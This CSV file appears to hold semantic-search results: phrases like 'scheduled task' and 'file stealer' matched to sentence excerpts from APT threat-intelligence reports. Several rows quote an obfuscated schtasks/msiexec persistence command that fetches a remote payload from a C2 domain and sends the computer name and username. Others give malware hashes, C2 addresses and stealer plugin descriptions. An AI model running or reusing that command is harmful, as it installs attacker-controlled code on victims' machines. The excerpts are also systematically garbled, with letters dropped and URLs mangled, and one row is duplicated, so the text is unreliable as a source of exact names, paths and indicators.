hash,phrase,similarity,adjacent_sentences
0797d04ce55799cf7c3246d39567ce99,Scheduled task,0.8551867234600203,"['Analyze The recipients of the document 41f0757ca4367f2b0aece32520879135c96ebe1dcafcd752d3f3c8d4a5cf 8.t are (at the end of the document): the deputy minister; - the units under the ministry; - police of provinces and cities directly under the central government; - Department of Inspection of Legal Documents of the Ministry of Justice; - Oficial Journal, Government Electronic Portal, Ministry of Public Security Portal; - Archive: VT, C06 (P1).', 'The document exploits Equation Editor starts aplication (CVE-2017182) to decode the 8.t in memory, after fork to instal two files: C:\\Users\\admin\\ApData\\Local\\Temp\\wsc.dl 4e8f8a3c3be45e0a59a868f2b2ace51754fcdbfa9ab618e3d9d0e1783190f and C:\\Users\\admin\\ApData\\Local\\Temp\\wsc_proxy.exe 1948b0df1f768d6d30ae7ecec50db7c817d09cb31b5e2ce9b86a4047da The malware is a dl, it sems to be Gh0st RAT.', 'htps:/ap.any.run/tasks/5715cfe3-250-4808-ad0-1ea4c4fc7a8 An to start the malware, it uses a side loading technics with a scheduled Task.', 'The exe cal in the entry loads dynamicaly wsc.dl and cal the function _run@4 htps:/medium.com/chineses-actor-apt-target-ministry-of-justice-vietnamese-14f13c1c906 1/4 5/14/2019 Chineses Actor APT target Ministry of Justice Vietnamese Side Loading Scheduled Task The RAT tries to conect to nicetis54.lflink.com|185.216.35.1.', 'htps:/medium.com/chineses-actor-apt-target-ministry-of-justice-vietnamese-14f13c1c906 2/4 5/14/2019 Chineses Actor APT target Ministry of Justice Vietnamese Threat Inteligence Consideration We have the same Tps and victimology like Goblin Panda: Oficials Vietnameses Side Loading 8.t RTF kit exploit a dynamic dns name But the payload has changed and the launch of the backdor has changed.', 'Its used a scheduled task.', 'Usualy this group uses NewCoreRat.', 'IOCs Main object- 41f0757ca4367f2b0aece32520879135c96ebe1dcafcd752d3f3c8d4a5cf sha256 41f0757ca4367f2b0aece32520879135c96ebe1dcafcd752d3f3c8d4a5cf sha1 6e670a837970a1fb4161d7d5f720d318d7e4dbc md5 f3451418eb4689560cd6c0c654f26d9 Droped executable file sha256 C:\\Users\\admin\\ApData\\Local\\Temp\\wsc.dl 4e8f8a3c3be45e0a59a868f2b2ace51754fcdbfa9ab618e3d9d0e1783190f sha256 C:\\Users\\admin\\ApData\\Local\\Temp\\wsc_proxy.exe 1948b0df1f768d6d30ae7ecec50db7c817d09cb31b5e2ce9b86a4047da htps:/medium.com/chineses-actor-apt-target-ministry-of-justice-vietnamese-14f13c1c906 3/4 5/14/2019 Chineses Actor APT target Ministry of Justice Vietnamese DNS requests domain nicetis54.lflink.com Conections ip 185.216.35.1 htps:/medium.com/chineses-actor-apt-target-ministry-of-justice-vietnamese-14f13c1c906 4/4']"
cae33c8970a53857dff6608fe8894b8a,create a scheduled task,0.8433953123588676,"['Copyright Leonardo S.p.a. Al rights reserved 2 Company General Use MALWARE TECHNICAL INSIGHT: TURLA Penquin_x64 6.', 'MITRE AT&CK TPs T1059 Comand-Line Comand-line interfaces provide a way of interacting with computer Interface systems and is a comon feature acros many types of operating system platforms.', 'One example comand-line interface on Windows systems is cmd, which can be used to perform a number of tasks including execution of other software.', 'Comand-line interfaces can be interacted with localy or remotely via a remote desktop aplication, reverse shel sesion, etc.', 'Comands that are executed run with the curent permision level of the comand-line interface proces unles the comand includes proces invocation that changes permisions context for that execution (e.g.', 'Scheduled Task).', 'T1205 Port Knocking Port Knocking is a wel-established method used by both defenders and adversaries to hide open ports from aces.', 'To enable a port, an adversary sends a series of packets with certain characteristics before the port wil be opened.', 'Usualy this series of packets consists of atempted conections to a predefined sequence of closed ports, but can involve unusual flags, specific strings or other unique characteristics.', 'After the sequence is completed, opening a port is often acomplished by the host based firewal, but could also be implemented by custom software.', 'T105 Remote File Files may be copied from one system to another to stage adversary Copy tols or other files over the course of an operation.']"
88d674726f92a0b205d41f6b44c23d24,The computer name,0.9942504715728093,[]
88d674726f92a0b205d41f6b44c23d24,The computer name,0.9942504715728093,[]
475cc557a403e5a686bf4e9a5b16e3d2,The computer name,0.775710754431105,"['dedicated USB bot device.', 'Pop!_OS: This is my primary Today, I kep my multi-bot with me operating system.', 'Having a botable at al times.', 'Often, I forget that boting live version alows me to repair or is the main purpose since I also use it restore the system.', 'I can also quickly to transfer large files.', 'The best-case instal the OS to any other computer.', 'scenario is that you wil never ned it.', 'Tails: This botable OS (tails.boum.', 'If you do, you wil be glad you made org) alows me to launch an entire these eforts.', 'OS which is protected by the Tor network.', 'It is beneficial for sensitive investigations which must poses a private conection and leave no trace behind.']"
0d1c0b15d71a2e81bf1d3fc93557761d,the computer name is sent to the C2,0.8178311130445094,"['These can be used to simply execute arbitrary code, in these cases, they are also used to create scheduled tasks for persistence and downloading of the next stage.', 'We have noted multiple versions of these CHM payloads.', 'CHM payloads are useful for the actor as it requires a low amount of user interaction, it does not require a vulnerable version of Microsoft Ofice instaled like the Excel files, and it also uses LZX compresion that wil bypas static malware analysis solutions that do not decompres the file.', 'The first version of the CHM file wil create a scheduled task that wil use the living of the land binary msiexec to execute a remote MSI payload from the C2.', 'String concatenation is used to break up the string for obfuscation.', 'The computer name and the username is also sent to the C2.', '""C:\\Windows\\System32\\schtasks.exe"" /create /sc minute /mo 15 /tn AdobeUpdater /tr ""%coMSPec% /c s^t^a^rt /^m^i^n m^s^i^e^xe^c ^/^i ht^p:/^/mirz^adih^ati^[.', ']com^/cs^s/t^ry.php?h=%computername%*%username% /^q^n ^/^norestart"" /ft We did not fetch any aditional payloads from the C2, but we were served empty MSI files, alowing us to discover the names of the next stage payloads.', 'Figure 5: Empty payloads served from diferent C2 servers This may alow the actor to examine the server logs of beaconing infected machines before deciding whether to swap out the empty file with an actual payload if the target loks promising enough, thus protecting the next stage of the atack.', 'Biter APT do not apear to change their tactics to much, therefore we can asume that the payloads wil be similar to those observed in 2021, executing a downloader module that can be served with plugins such as a keyloger, remote aces tol, file stealer, or browser credential stealer.', 'The second version of the CHM payload abstracts the same activity through an encoded PowerShel comand stage, obfuscating the activity further than just simple string concatenation.']"
0d1c0b15d71a2e81bf1d3fc93557761d,the username is also sent to the C2.,0.8456263203043786,"['These can be used to simply execute arbitrary code, in these cases, they are also used to create scheduled tasks for persistence and downloading of the next stage.', 'We have noted multiple versions of these CHM payloads.', 'CHM payloads are useful for the actor as it requires a low amount of user interaction, it does not require a vulnerable version of Microsoft Ofice instaled like the Excel files, and it also uses LZX compresion that wil bypas static malware analysis solutions that do not decompres the file.', 'The first version of the CHM file wil create a scheduled task that wil use the living of the land binary msiexec to execute a remote MSI payload from the C2.', 'String concatenation is used to break up the string for obfuscation.', 'The computer name and the username is also sent to the C2.', '""C:\\Windows\\System32\\schtasks.exe"" /create /sc minute /mo 15 /tn AdobeUpdater /tr ""%coMSPec% /c s^t^a^rt /^m^i^n m^s^i^e^xe^c ^/^i ht^p:/^/mirz^adih^ati^[.', ']com^/cs^s/t^ry.php?h=%computername%*%username% /^q^n ^/^norestart"" /ft We did not fetch any aditional payloads from the C2, but we were served empty MSI files, alowing us to discover the names of the next stage payloads.', 'Figure 5: Empty payloads served from diferent C2 servers This may alow the actor to examine the server logs of beaconing infected machines before deciding whether to swap out the empty file with an actual payload if the target loks promising enough, thus protecting the next stage of the atack.', 'Biter APT do not apear to change their tactics to much, therefore we can asume that the payloads wil be similar to those observed in 2021, executing a downloader module that can be served with plugins such as a keyloger, remote aces tol, file stealer, or browser credential stealer.', 'The second version of the CHM payload abstracts the same activity through an encoded PowerShel comand stage, obfuscating the activity further than just simple string concatenation.']"
0d1c0b15d71a2e81bf1d3fc93557761d,The computer name and the username is also sent to the C2.,1.0,"['These can be used to simply execute arbitrary code, in these cases, they are also used to create scheduled tasks for persistence and downloading of the next stage.', 'We have noted multiple versions of these CHM payloads.', 'CHM payloads are useful for the actor as it requires a low amount of user interaction, it does not require a vulnerable version of Microsoft Ofice instaled like the Excel files, and it also uses LZX compresion that wil bypas static malware analysis solutions that do not decompres the file.', 'The first version of the CHM file wil create a scheduled task that wil use the living of the land binary msiexec to execute a remote MSI payload from the C2.', 'String concatenation is used to break up the string for obfuscation.', 'The computer name and the username is also sent to the C2.', '""C:\\Windows\\System32\\schtasks.exe"" /create /sc minute /mo 15 /tn AdobeUpdater /tr ""%coMSPec% /c s^t^a^rt /^m^i^n m^s^i^e^xe^c ^/^i ht^p:/^/mirz^adih^ati^[.', ']com^/cs^s/t^ry.php?h=%computername%*%username% /^q^n ^/^norestart"" /ft We did not fetch any aditional payloads from the C2, but we were served empty MSI files, alowing us to discover the names of the next stage payloads.', 'Figure 5: Empty payloads served from diferent C2 servers This may alow the actor to examine the server logs of beaconing infected machines before deciding whether to swap out the empty file with an actual payload if the target loks promising enough, thus protecting the next stage of the atack.', 'Biter APT do not apear to change their tactics to much, therefore we can asume that the payloads wil be similar to those observed in 2021, executing a downloader module that can be served with plugins such as a keyloger, remote aces tol, file stealer, or browser credential stealer.', 'The second version of the CHM payload abstracts the same activity through an encoded PowerShel comand stage, obfuscating the activity further than just simple string concatenation.']"
75291a1b40c627ac33b55119a494eacd,file stealer,0.7819941275633288,"['SPECIAL REPORT OPERATION SAFRON ROSE 2013 Authors: Nart Vileneuve, Ned Moran, Thoufique Haq and Mike Scot SECURITY REIMAGINED Fireye: Operation Safron Rose 2013 CONTENTS Introduction 2 .', 'Background 2 .', 'Atack Vectors 4 .', 'The Stealer Malware 6 .', 'The Stealer Builder and Tols 1 .', 'Comand-and-Control Infrastructure 13 .', 'Victimology 15 .', 'Atribution 16 .', 'Conclusion 19 .']"
18fdef6f2cea9e0b1ab1a71f532e578a,file stealer,0.7819941275633288,"['SPECIAL REPORT OPERATION SAFRON ROSE 2013 Authors: Nart Vileneuve, Ned Moran, Thoufique Haq and Mike Scot SECURITY REIMAGINED Fireye: Operation Safron Rose 2013 CONTENTS Introduction 2 .', 'Background 2 .', 'Atack Vectors 4 .', 'The Stealer Malware 6 .', 'The Stealer Builder and Tols 1 .', 'Comand-and-Control Infrastructure 13 .', 'Victimology 15 .', 'Atribution 16 .', 'Conclusion 19 .']"
c7c9dc3d3f903b2ce98ced8a8e8576c2,file stealer,1.0,"['We believe that MoustachedBouncer uses a lawful interception system (such as SORM) to conduct its AitM operations.', 'We ases with low confidence that MoustachedBouncer is closely coperating with Winter Vivern, another group targeting European diplomats but using diferent TPs.', 'Since 2014, the group has ben operating a malware framework that we have named NightClub.', 'It uses the SMTP and IMAP (email) protocols for C&C comunications.', 'Starting in 2020, the group has ben using, in paralel, a second malware framework we have named Disco.', 'Both NightClub and Disco suport aditional spying plugins including a screnshoter, an audio recorder, and a file stealer.', 'Victimology Acording to ESET telemetry, the group targets foreign embasies in Belarus, and we have identified four diferent countries whose embasy staf have ben targeted: two from Europe, one from South Asia, and one from Africa.', 'The key dates are shown in Figure 1.', '1/20 Figure 1.', 'Timeline of MoustachedBouncer activities Atribution While we track MoustachedBouncer as a separate group, we have found elements that make us ases with low confidence that they are closely colaborating with another group known as Winter Vivern.', 'The later was discovered in 2021 and is stil active as of 2023.']"
8be76b8e09117447731108cd5189e509,file stealer,1.0,"['It is important to note that the plugins dont have unique internal identification numbers; therefore we are identifying them here by their DL names on disk, which we have never sen change.', 'Table 2.', 'List of plugin DL files Plugin DL name Overview Keyloger.', 'Kstrcs.dl It only actively logs keystrokes when the foreground window belongs to a proces named Q.exe and the window title matches QEdit.', ""It's likely target is the Tencent Q chat aplication."", 'File stealer.', 'Has a configuration file that enables the colection of files from diferent sources: HDs, sebasek.dl USB thumb drives, and CD-ROMs; as wel as criteria based on the file properties: filename must contain a keyword from a predefined list, file size must be betwen a defined a minimum and maximum size.', 'Captures text copied to the clipboard and logs information from the USBSTOR registry Cbmrpa.dl key.', 'pRsm.dl Captures input and output audio streams.', 'Credential stealer.', 'mailLFPasword.dl Steals credentials from Outlok and Foxmail email client software.']"
